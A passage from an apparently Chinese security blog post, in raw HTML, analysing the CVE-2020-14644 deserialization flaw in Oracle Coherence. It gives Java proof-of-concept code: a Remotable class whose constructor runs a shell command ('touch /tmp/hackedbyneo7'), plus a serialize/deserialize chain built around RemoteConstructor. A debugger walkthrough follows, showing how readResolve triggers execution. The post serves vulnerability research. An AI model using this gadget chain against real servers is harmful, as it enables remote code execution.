</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-19>19</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//package pers.neo;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//import com.tangosol.internal.util.invoke.ClassDefinition;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//import com.tangosol.internal.util.invoke.ClassIdentity;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//import com.tangosol.internal.util.invoke.RemoteConstructor;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2020_14644</span><span style=color:#f92672>()</span> <span style=color:#66d9ef>throws</span> NotFoundException<span style=color:#f92672>,</span> IOException<span style=color:#f92672>,</span> CannotCompileException <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        String sobj <span style=color:#f92672>=</span> serialize<span style=color:#f92672>(</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        System.out.println(sobj);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        deserialize<span style=color:#f92672>(</span>sobj<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-29>29</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.Remotable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.RemoteConstructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.Serializable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test7</span> <span style=color:#66d9ef>implements</span> Remotable<span style=color:#f92672>,</span>Serializable <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>test7</span><span style=color:#f92672>()</span>  <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;calc&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;touch /tmp/hackedbyneo7&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        cmd=&#34;mkdir d:\\byoam&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> RemoteConstructor <span style=color:#a6e22e>getRemoteConstructor</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setRemoteConstructor</span><span style=color:#f92672>(</span>RemoteConstructor remoteConstructor<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>需要注意的是，这里的test7必须实现Remotable和Serializable接口，否则会报错。</p><p>记住这个 <code>com.tangosol.internal.util.invoke.Remotable</code> 接口，利用CVE-2020-14644时必须实现它，而利用CVE-2021-35587 时不需要实现它，这一点困扰了我很久。</p><p><img loading=lazy src=image-20220713114829787.png alt=image-20220713114829787></p><p><img loading=lazy src=image-20220713114749977.png alt=image-20220713114749977></p><h4 id=调试分析-1>调试分析<a hidden class=anchor aria-hidden=true href=#调试分析-1>#</a></h4><h5 id=开始反序列化>开始反序列化<a hidden class=anchor aria-hidden=true href=#开始反序列化>#</a></h5><p><img loading=lazy src=image-20220713120035755.png alt=image-20220713120035755></p><h5 id=构建-remoteconstructor-对象>构建 RemoteConstructor 对象<a hidden class=anchor aria-hidden=true href=#构建-remoteconstructor-对象>#</a></h5><p>我们要构建的对象属于 <code>com.tangosol.internal.util.invoke.RemoteConstructor</code> 类型，有m_aoArgs和m_definition两个属性，其中 <code>m_aoArgs</code> 是 <code>[Ljava/lang/Object</code> 类型，<code>m_definition</code> 是 <code>Lcom/tangosol/internal/util/invoke/ClassDefinition</code> 类型。</p><p><img loading=lazy src=image-20220713150255877.png alt=image-20220713150255877></p><p>从类定义来看也确实如此</p><p><img loading=lazy src=image-20220713164629698.png alt=image-20220713164629698></p><p>实例化一个 RemoteConstructor 对象</p><p><img loading=lazy src=image-20220713151023224.png alt=image-20220713151023224></p><p>填充属性</p><p><img loading=lazy src=image-20220713151644125.png alt=image-20220713151644125></p><p>读取并填充基本数据类型(primitive Data)，这个 RemoteConstructor 对象没有。</p><p>基本数据类型有八类 （https://www.w3schools.com/java/java_data_types.asp）</p><table><thead><tr><th style=text-align:left>Data Type</th><th style=text-align:left>Size</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>byte</code></td><td style=text-align:left>1 byte</td><td style=text-align:left>Stores whole numbers from -128 to 127</td></tr><tr><td style=text-align:left><code>short</code></td><td style=text-align:left>2 bytes</td><td style=text-align:left>Stores whole numbers from -32,768 to 32,767</td></tr><tr><td style=text-align:left><code>int</code></td><td style=text-align:left>4 bytes</td><td style=text-align:left>Stores whole numbers from -2,147,483,648 to 2,147,483,647</td></tr><tr><td style=text-align:left><code>long</code></td><td style=text-align:left>8 bytes</td><td style=text-align:left>Stores whole numbers from -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807</td></tr><tr><td style=text-align:left><code>float</code></td><td style=text-align:left>4 bytes</td><td style=text-align:left>Stores fractional numbers. Sufficient for storing 6 to 7 decimal digits</td></tr><tr><td style=text-align:left><code>double</code></td><td style=text-align:left>8 bytes</td><td style=text-align:left>Stores fractional numbers. Sufficient for storing 15 decimal digits</td></tr><tr><td style=text-align:left><code>boolean</code></td><td style=text-align:left>1 bit</td><td style=text-align:left>Stores true or false values</td></tr><tr><td style=text-align:left><code>char</code></td><td style=text-align:left>2 bytes</td><td style=text-align:left>Stores a single character/letter or ASCII values</td></tr></tbody></table><p><img loading=lazy src=image-20220713152012724.png alt=image-20220713152012724></p><p>有两个非基本数据类型的对象，逐一从数据流中读取并反序列化，放到objVals中</p><p><img loading=lazy src=image-20220713152610326.png alt=image-20220713152610326></p><h5 id=构建object对象m_aoargs>构建Object[]对象（m_aoArgs）<a hidden class=anchor aria-hidden=true href=#构建object对象m_aoargs>#</a></h5><p>属性一是一个Object Array</p><p><img loading=lazy src=image-20220713152919182.png alt=image-20220713152919182></p><h5 id=构建-classdefinition-对象m_definition>构建 ClassDefinition 对象（m_definition）<a hidden class=anchor aria-hidden=true href=#构建-classdefinition-对象m_definition>#</a></h5><p>反序列化属性二</p><p><img loading=lazy src=image-20220713153154374.png alt=image-20220713153154374></p><p>是一个对象</p><p><img loading=lazy src=image-20220713153237552.png alt=image-20220713153237552></p><p>具体来说是一个 <code>com.tangosol.internal.util.invoke.ClassDefinition</code> 类型的对象</p><p><img loading=lazy src=image-20220713153456984.png alt=image-20220713153456984></p><p>实例化ClassDefinition对象，有4个属性</p><p><img loading=lazy src=image-20220713153931494.png alt=image-20220713153931494></p><p>其中 m_id 和 m_abClass 可以通过序列化数据还原</p><p><img loading=lazy src=image-20220713154041392.png alt=image-20220713154041392></p><p>填充 ClassDefinition 对象</p><p><img loading=lazy src=image-20220713154832227.png alt=image-20220713154832227></p><p>读取基本数据类型的属性，也是空</p><p><img loading=lazy src=image-20220713155008243.png alt=image-20220713155008243></p><p>逐个读取 ClassDefinition 的属性</p><p><img loading=lazy src=image-20220713155242182.png alt=image-20220713155242182></p><h5 id=构建byte-array对象m_abclass>构建Byte Array对象（m_abClass）<a hidden class=anchor aria-hidden=true href=#构建byte-array对象m_abclass>#</a></h5><p>m_abClass 是一个 byte Array</p><p><img loading=lazy src=image-20220713155336840.png alt=image-20220713155336840></p><p>读到的正是 test7 对象的字节码</p><p><img loading=lazy src=image-20220713160241116.png alt=image-20220713160241116></p><h5 id=构建-classidentity-对象m_id>构建 ClassIdentity 对象（m_id）<a hidden class=anchor aria-hidden=true href=#构建-classidentity-对象m_id>#</a></h5><p><img loading=lazy src=image-20220713160333779.png alt=image-20220713160333779></p><p>m_id 是一个Object</p><p><img loading=lazy src=image-20220713160511169.png alt=image-20220713160511169></p><p>实例化一个 <code>com.tangosol.internal.util.invoke.ClassIdentity</code></p><p><img loading=lazy src=image-20220713160641085.png alt=image-20220713160641085></p><p>有 m_sPackage，m_sBaseName，m_sVersion 三个属性</p><p><img loading=lazy src=image-20220713160848857.png alt=image-20220713160848857></p><p>填充属性</p><p><img loading=lazy src=image-20220713161253225.png alt=image-20220713161253225></p><p><img loading=lazy src=image-20220713161340971.png alt=image-20220713161340971></p><p>没有基本类型的数据</p><p><img loading=lazy src=image-20220713161434561.png alt=image-20220713161434561></p><h5 id=依次构建m_spackagem_sbasenamem_sversion>依次构建m_sPackage/m_sBaseName/m_sVersion<a hidden class=anchor aria-hidden=true href=#依次构建m_spackagem_sbasenamem_sversion>#</a></h5><p><img loading=lazy src=image-20220713161846523.png alt=image-20220713161846523></p><p><img loading=lazy src=image-20220713161912889.png alt=image-20220713161912889></p><p>读到 m_sBaseName 为 test7</p><p><img loading=lazy src=image-20220713161949490.png alt=image-20220713161949490></p><p>读到 m_sPackage 为 pers/neo</p><p><img loading=lazy src=image-20220713162107210.png alt=image-20220713162107210></p><p>读到m_sVersion 为 B9E9F4911DEBD39E951545194CDAB172</p><p><img loading=lazy src=image-20220713162136409.png alt=image-20220713162136409></p><h5 id=完成--classidentity-对象m_id填充>完成 ClassIdentity 对象（m_id）填充<a hidden class=anchor aria-hidden=true href=#完成--classidentity-对象m_id填充>#</a></h5><p><img loading=lazy src=image-20220713162310941.png alt=image-20220713162310941></p><p><img loading=lazy src=image-20220713162510597.png alt=image-20220713162510597></p><p><img loading=lazy src=image-20220713162528068.png alt=image-20220713162528068></p><p>putObject是一个native函数</p><p><img loading=lazy src=image-20220713162628018.png alt=image-20220713162628018></p><p>完成填充</p><p><img loading=lazy src=image-20220713162722070.png alt=image-20220713162722070></p><p><img loading=lazy src=image-20220713162855429.png alt=image-20220713162855429></p><p><img loading=lazy src=image-20220713162918917.png alt=image-20220713162918917></p><h5 id=完成classdefinition-对象m_definition填充>完成ClassDefinition 对象（m_definition）填充<a hidden class=anchor aria-hidden=true href=#完成classdefinition-对象m_definition填充>#</a></h5><p><img loading=lazy src=image-20220713163233743.png alt=image-20220713163233743></p><p><img loading=lazy src=image-20220713163814769.png alt=image-20220713163814769></p><p>至此就创建完 RemoteConstructor 构造函数的两个参数对象了。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220713164104511.png alt=image-20220713164104511></p><h5 id=完成-remoteconstructor-对象填充>完成 RemoteConstructor 对象填充<a hidden class=anchor aria-hidden=true href=#完成-remoteconstructor-对象填充>#</a></h5><p><img loading=lazy src=image-20220713165057268.png alt=image-20220713165057268></p><p><img loading=lazy src=image-20220713172216440.png alt=image-20220713172216440></p><h5 id=readresolve>readResolve<a hidden class=anchor aria-hidden=true href=#readresolve>#</a></h5><p>至此已经完成了 RemoteConstructor 对象的创建，但我们的恶意代码并没有被执行。这个名为obj的对象也不会直接返回给我们使用。</p><p>在方法 <code>java.io.ObjectInputStream#readOrdinaryObject</code> return之前会先调用RemoteConstructor类的readResolve方法来创建一个实例rep，经过一些检查以后将rep赋值给obj，最终才返回。</p><p>这些操作据称是为了防止反序列化动作创建的实例导致单例模式被破坏。</p><blockquote><p><code>readResolve</code> is used for <em>replacing</em> the object read from the stream. The only use I&rsquo;ve ever seen for this is enforcing singletons; when an object is read, replace it with the singleton instance. This ensures that nobody can create another instance by serializing and deserializing the singleton.</p><p>——https://stackoverflow.com/a/1168375/15103280</p></blockquote><p>正是在这个过程中我们的恶意代码被执行了。</p><p><img loading=lazy src=image-20220713173504658.png alt=image-20220713173504658></p><p>readResolveMethod是 <code>com.tangosol.internal.util.invoke.RemoteConstructor.readResolve()</code></p><p><img loading=lazy src=image-20220713184244064.png alt=image-20220713184244064></p><p>看看实现</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-20>20</a>
